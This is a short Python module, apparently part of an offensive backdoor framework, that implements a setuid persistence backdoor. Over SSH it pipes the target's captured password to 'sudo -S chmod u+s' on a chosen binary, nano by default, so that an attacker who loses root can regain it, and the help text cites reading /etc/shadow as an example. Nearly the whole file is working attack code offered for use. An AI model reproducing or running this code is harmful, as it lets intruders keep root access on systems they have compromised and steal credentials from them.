from backdoor import *

class Setuid(Backdoor):
    prompt = Fore.RED + "(setuid) " + Fore.BLUE + ">> " + Fore.RESET 
    
    def __init__(self, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using setuid priviledge escalation backdoor..."
        self.core = core
        self.options = {
                "program"   : Option("program", "nano", "binary on which to set the setuid bit", True),
                }
        self.allow_modules = True
        self.modules = {} 
        self.help_text = INFO + "The SetUID backdoor works by setting the setuid bit on a binary while the user has root acccess, so that when that binary is later run by a user without root access, the binary is executed with root access.\n" + INFO +"By default, this backdoor flips the setuid bit on nano, so that if root access is ever lost, the attacker can SSH back in as an unpriviledged user and still be able to run nano (or any binary) as root. ('nano /etc/shadow')"

    def get_command(self):
        return "echo " + self.core.curtarget.pword + " | sudo -S chmod u+s %s" % (self.get_value("program"))
 
    def do_exploit(self, args):
        port = self.get_value("port")
        target = self.core.curtarget
        print(GOOD + "Initializing backdoor...")
        target.ssh.exec_command(self.get_command())
        print(GOOD + "Priviledge escalation backdoor created.")
        for mod in self.modules.keys():
            print(INFO + "Attempting to execute " + mod.name + " module...")
            mod.exploit()
